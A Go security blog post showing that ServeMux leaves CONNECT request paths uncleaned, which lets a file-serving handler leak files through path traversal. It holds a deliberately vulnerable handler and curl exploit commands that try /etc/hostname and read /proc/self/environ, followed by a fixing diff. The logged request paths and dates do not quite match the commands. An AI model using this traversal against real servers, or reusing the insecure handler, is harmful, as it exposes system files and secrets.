---
title: ServeMux and a path traversal vulnerability
date: 2020-04-14
tags:
 - go
 - web-security
 - path-traversal
url: /blog/servemux-and-path-traversal
ShowReadingTime: true
---

As a passionate Go developer, I've come to appreciate the language's simplicity
and power. However, even in a well-designed language like Go, security
vulnerabilities can lurk in unexpected places. In this post, we'll explore a
common misconception about Go's `ServeMux` that can lead to a path traversal
vulnerability.

> **TL;DR:** Many developers assume that `ServeMux` always sanitizes URL request
paths, but this isn't *always* the case.

# The Issue

Consider the following code snippet, where we let the user read the files
content in `/tmp` folder:
```go
package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"path/filepath"
	"strings"
)

const root = "/tmp"

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		filename := filepath.Join(root, strings.Trim(r.URL.Path, "/"))
		contents, err := ioutil.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Write(contents)
	})

	server := &http.Server{
		Addr:    "127.0.0.1:50000",
		Handler: mux,
	}

	log.Fatal(server.ListenAndServe())
}
```

Here we are creating a file in `/tmp` folder to test if we will be able to read
the file contents:
```sh
$ echo content > /tmp/somefile
$ curl -v 127.0.0.1:50000/somefile
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> GET /somefile HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 18 Jul 2018 18:08:46 GMT
< Content-Length: 8
< Content-Type: text/plain; charset=utf-8
< 
content
* Connection #0 to host 127.0.0.1 left intact
```

We've successfully read the file.

Since we call `ioutil.ReadFile` function for a user-supplied input
`r.URL.Path` this might seem like a path traversal vulnerability.

Are we able to read any arbitrary file by
providing relative-path pattern? Let's try to read `../../etc/hostname` for
example:
```sh
$ curl -v --path-as-is 127.0.0.1:50000/somefile/../../etc/hostname
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> GET /something/../../../etc/hostname HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=utf-8
< Location: /etc/hostname
< Date: Wed, 18 Jul 2018 18:07:35 GMT
< Content-Length: 48
< 
<a href="/etc/hostname">Moved Permanently</a>.

* Connection #0 to host 127.0.0.1 left intact
```

It turns out that `ServeMux` canonicalizes the requested path, so it's not
easily exploitable, but indeed it's still vulnerable.

Here's how we can exploit it using the `CONNECT` method:
```sh
$ curl -v -X CONNECT --path-as-is 127.0.0.1:50000/../../proc/self/environ
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 50000 (#0)
> CONNECT /../../proc/self/environ HTTP/1.1
> Host: 127.0.0.1:50000
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 18 Jul 2018 18:17:55 GMT
< Content-Type: application/octet-stream
< Transfer-Encoding: chunked
< 
REDACTED
```

Bingo.

I should note that this is an expected behaviour and
[clearly documented](https://golang.org/pkg/net/http/#ServeMux.Handler)
in the `net/http` package docs:
> The path and host are used unchanged for CONNECT requests.

# Remediation

Use `filepath.FromSlash` accompanied by `path.Clean` and a [preceding forward slash](https://twitter.com/raphsutti/status/1248871606291542016/photo/1):
```diff
$ diff --git a/main.go b/main.go
index d50e6f3..91e5015 100644
--- a/main.go
+++ b/main.go
@@ -4,6 +4,7 @@ import (
        "io/ioutil"
        "log"
        "net/http"
+       "path"
        "path/filepath"
        "strings"
 )
@@ -13,7 +14,7 @@ const root = "/tmp"
 func main() {
        mux := http.NewServeMux()
        mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-               filename := filepath.Join(root, strings.Trim(r.URL.Path, "/"))
+               filename := filepath.Join(root, filepath.FromSlash(path.Clean("/"+strings.Trim(r.URL.Path, "/"))))
                contents, err := ioutil.ReadFile(filename)
                if err != nil {
                        w.WriteHeader(http.StatusNotFound)
```


Also, it's a good practice to limit acceptable request methods.

If you're not able to fix the code - put a vulnerable service behind a reverse proxy like nginx, which does not allow `CONNECT` method request by default.
